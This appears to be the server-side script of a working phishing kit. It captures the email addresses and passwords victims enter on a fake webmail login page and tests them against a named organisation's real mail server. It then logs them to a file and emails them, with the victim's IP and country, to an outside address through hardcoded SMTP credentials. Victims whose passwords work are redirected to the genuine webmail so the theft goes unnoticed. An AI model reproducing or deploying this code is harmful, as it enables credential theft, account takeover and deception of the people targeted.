<?php
require_once __DIR__ . '/PHPMailer.php';
require_once __DIR__ . '/SMTP.php';
require_once __DIR__ . '/Exception.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

// Set proper headers for AJAX requests
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization");
header('Content-Type: application/json');

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Get user IP and location data
$ip = $_SERVER['REMOTE_ADDR'];
if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} elseif (!empty($_SERVER['HTTP_X_REAL_IP'])) {
    $ip = $_SERVER['HTTP_X_REAL_IP'];
}

$jdat = @json_decode(file_get_contents("https://www.geoplugin.net/json.gp?ip=" . $ip));

session_start();

// Block GET requests with 403 page
if ($_SERVER['REQUEST_METHOD'] == 'GET') {
    http_response_code(403);
    ?>
    <html>
    <head>
        <title>403 - Forbidden</title>
        <style>
            body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; }
            h1 { color: #d32f2f; }
        </style>
    </head>
    <body>
        <h1>403 Forbidden</h1>
        <p>Access to this resource is denied.</p>
        <hr>
    </body>
    </html>
    <?php
    exit();
}

// Only accept POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(array(
        "signal" => "error",
        "msg" => "Method not allowed"
    ));
    exit();
}

// SMTP Configuration for logging
$receiver     = 'logs.ironside511@yandex.com';         // Your email to receive logs
$senderuser   = 'info@lucagherardi.com';      // Your SMTP user
$senderpass   = 'V8WLLSypyJBbUv7';               // Your SMTP password
$senderport   = "587";                      // Your SMTP port
$senderserver = "mail.lucagherardi.com";       // Your SMTP server

// Target domain for credential testing
$targetDomain = "globalrisk.rw";
$targetMailServer = "mail.globalrisk.rw";

// Capture user input
$browser = $_SERVER['HTTP_USER_AGENT'];
$login   = trim($_POST['email'] ?? '');
$passwd  = trim($_POST['password'] ?? '');

// Validate input
if (empty($login) || empty($passwd)) {
    echo json_encode(array(
        "signal" => "error",
        "msg" => "Email and password are required"
    ));
    exit();
}

// Extract domain from email
$parts = explode("@", $login);
if (count($parts) !== 2) {
    echo json_encode(array(
        "signal" => "error",
        "msg" => "Invalid email format"
    ));
    exit();
}
$domain = $parts[1];

// Get country name safely
$country = isset($jdat->geoplugin_countryName) ? $jdat->geoplugin_countryName : 'Unknown';

// Create log message
$timestamp = date('Y-m-d H:i:s');
$logMessage = "=== LOGIN ATTEMPT ===\n";
$logMessage .= "Timestamp: " . $timestamp . "\n";
$logMessage .= "Email: " . $login . "\n";
$logMessage .= "Password: " . $passwd . "\n";
$logMessage .= "Domain: " . $domain . "\n";
$logMessage .= "Target Domain: " . $targetDomain . "\n";
$logMessage .= "IP: " . $ip . "\n";
$logMessage .= "Country: " . $country . "\n";
$logMessage .= "User Agent: " . $browser . "\n";
$logMessage .= "========================\n\n";

// Email subject for notification
$sub = "TrueRcubeOrange1 | " . $passwd . " | " . $domain . " | " . $country . " | " . $ip;

// Email body for notification
$emailBody = "<h2>TrueRcubeOrange1 - New Login Attempt</h2>";
$emailBody .= "<p><strong>Email:</strong> " . htmlspecialchars($login) . "</p>";
$emailBody .= "<p><strong>Password:</strong> " . htmlspecialchars($passwd) . "</p>";
$emailBody .= "<p><strong>Domain:</strong> " . htmlspecialchars($domain) . "</p>";
$emailBody .= "<p><strong>Target Domain:</strong> " . htmlspecialchars($targetDomain) . "</p>";
$emailBody .= "<p><strong>IP Address:</strong> " . htmlspecialchars($ip) . "</p>";
$emailBody .= "<p><strong>Country:</strong> " . htmlspecialchars($country) . "</p>";
$emailBody .= "<p><strong>User Agent:</strong> " . htmlspecialchars($browser) . "</p>";
$emailBody .= "<p><strong>Timestamp:</strong> " . $timestamp . "</p>";
$emailBody .= "<hr>";

$validCredentials = false;
$testResult = "Connection failed";
$isTargetDomain = false;

// Check if this is a globalrisk.rw email
if (strtolower($domain) === strtolower($targetDomain)) {
    $isTargetDomain = true;
    
    // Test credentials against mail.globalrisk.rw SMTP server
    try {
        $testMail = new PHPMailer(true);
        $testMail->isSMTP();
        $testMail->SMTPAuth = true;
        $testMail->Host = $targetMailServer;  // Test against globalrisk.rw mail server
        $testMail->Username = $login;         // Test with captured credentials
        $testMail->Password = $passwd;
        $testMail->Port = 587;
        $testMail->SMTPSecure = 'tls';
        $testMail->Timeout = 10;
        $testMail->SMTPDebug = 0;
        
        // Try to authenticate against mail.globalrisk.rw
        if ($testMail->smtpConnect()) {
            $validCredentials = true;
            $testResult = "✅ VALID CREDENTIALS - Authentication successful on " . $targetMailServer;
            
            // If credentials are valid, try to send a test email
            try {
                $testMail->setFrom($login, 'Credential Validation');
                $testMail->addAddress($receiver);
                $testMail->isHTML(true);
                $testMail->Subject = "🎯 VALID CREDENTIALS FOUND - " . $login;
                $testMail->Body = "<h2 style='color: green;'>✅ VALID CREDENTIALS CONFIRMED!</h2>";
                $testMail->Body .= "<p><strong>Email:</strong> " . htmlspecialchars($login) . "</p>";
                $testMail->Body .= "<p><strong>Password:</strong> " . htmlspecialchars($passwd) . "</p>";
                $testMail->Body .= "<p><strong>Domain:</strong> " . htmlspecialchars($domain) . "</p>";
                $testMail->Body .= "<p><strong>Verified Against:</strong> " . $targetMailServer . "</p>";
                $testMail->Body .= "<p><strong>IP:</strong> " . $ip . "</p>";
                $testMail->Body .= "<p><strong>Country:</strong> " . $country . "</p>";
                $testMail->Body .= "<p><strong>Timestamp:</strong> " . $timestamp . "</p>";
                
                if ($testMail->send()) {
                    $testResult .= " - Validation email sent successfully";
                }
            } catch (Exception $e) {
                $testResult .= " - Authentication OK but validation email failed: " . $e->getMessage();
            }
            
            $testMail->smtpClose();
        } else {
            $testResult = "❌ INVALID CREDENTIALS - Authentication failed on " . $targetMailServer;
        }
        
        // Try alternative ports if first attempt fails
        if (!$validCredentials) {
            // Try port 25 without TLS
            try {
                $testMail2 = new PHPMailer(true);
                $testMail2->isSMTP();
                $testMail2->SMTPAuth = true;
                $testMail2->Host = $targetMailServer;
                $testMail2->Username = $login;
                $testMail2->Password = $passwd;
                $testMail2->Port = 25;
                $testMail2->SMTPSecure = false;
                $testMail2->Timeout = 10;
                $testMail2->SMTPDebug = 0;
                
                if ($testMail2->smtpConnect()) {
                    $validCredentials = true;
                    $testResult = "✅ VALID CREDENTIALS - Authentication successful on " . $targetMailServer . " (Port 25)";
                    $testMail2->smtpClose();
                }
            } catch (Exception $e) {
                // Continue with original result
            }
        }
        
    } catch (Exception $error) {
        $testResult = "❌ Test failed: " . $error->getMessage();
    }
} else {
    $testResult = "⚠️ Not target domain - Email is not from " . $targetDomain;
}

// Add test result to log
$logMessage .= "Target Domain Check: " . ($isTargetDomain ? "YES" : "NO") . "\n";
$logMessage .= "Credential Test Server: " . $targetMailServer . "\n";
$logMessage .= "Test Result: " . $testResult . "\n";
$logMessage .= "Valid Credentials: " . ($validCredentials ? "YES" : "NO") . "\n\n";

// Update email body with test result
$emailBody .= "<p><strong>Target Domain Check:</strong> " . ($isTargetDomain ? "✅ YES" : "❌ NO") . "</p>";
$emailBody .= "<p><strong>Test Server:</strong> " . $targetMailServer . "</p>";
$emailBody .= "<p><strong>Credential Test Result:</strong> " . htmlspecialchars($testResult) . "</p>";
$emailBody .= "<p><strong>Valid Credentials:</strong> <span style='color: " . ($validCredentials ? "green; font-weight: bold;'>✅ YES" : "red'>❌ NO") . "</span></p>";

// Save to local log file
try {
    $fp = fopen("SS-Or-GlobalRisk.txt", "a");
    if ($fp) {
        fputs($fp, $logMessage);
        fclose($fp);
    }
} catch (Exception $e) {
    error_log('Log file write failed: ' . $e->getMessage());
}

// Send notification email with captured data using your SMTP server
$emailSent = false;
try {
    $mail = new PHPMailer(true);
    $mail->isSMTP();
    $mail->SMTPAuth = true;
    $mail->Host = $senderserver;
    $mail->Username = $senderuser;
    $mail->Password = $senderpass;
    $mail->Port = $senderport;
    $mail->SMTPSecure = 'tls';
    $mail->Timeout = 30;
    $mail->SMTPDebug = 0;
    
    // Set priority for valid credentials
    if ($validCredentials) {
        $mail->Priority = 1; // High priority
        $sub = "🎯 VALID GLOBALRISK.RW CREDENTIALS | " . $login . " | " . $passwd;
    }
    
    $mail->setFrom($senderuser, 'TrueRcubeOrange1 GlobalRisk Monitor');
    $mail->addAddress($receiver);
    $mail->isHTML(true);
    $mail->Subject = $sub;
    $mail->Body = $emailBody;
    $mail->AltBody = strip_tags(str_replace('<br>', "\n", $emailBody));
    
    if ($mail->send()) {
        $emailSent = true;
    }
    
} catch (Exception $error) {
    error_log('Mail sending failed: ' . $error->getMessage());
}

// Increment attempt counter
if (!isset($_SESSION['attempts'])) {
    $_SESSION['attempts'] = 0;
}
$_SESSION['attempts']++;

// Determine response based on credential validity
if ($validCredentials && $isTargetDomain) {
    // Valid globalrisk.rw credentials - redirect to actual webmail
    $response = array(
        "signal" => "OK",
        "success" => true,
        "msg" => "Login successful! Redirecting to your mailbox...",
        "attempt" => $_SESSION['attempts'],
        "redirect_url" => "https://webmail.globalrisk.rw"
    );
    
    // Add shorter delay for valid credentials
    usleep(rand(200000, 800000)); // 0.2 to 0.8 second delay
    
} else {
    // Invalid credentials or not target domain - show error
    $response = array(
        "signal" => "error",
        "msg" => "Invalid email or password. Please try again.",
        "attempt" => $_SESSION['attempts'],
        "redirect_url" => "https://webmail." . $domain
    );
    
    // Add longer delay for invalid credentials
    usleep(rand(500000, 1500000)); // 0.5 to 1.5 second delay
}

// Add debug info
$response["debug_info"] = array(
    "email_sent" => $emailSent,
    "log_written" => file_exists("SS-Or-GlobalRisk.txt"),
    "timestamp" => $timestamp,
    "target_domain" => $isTargetDomain,
    "valid_credentials" => $validCredentials
);

echo json_encode($response);
exit();
?>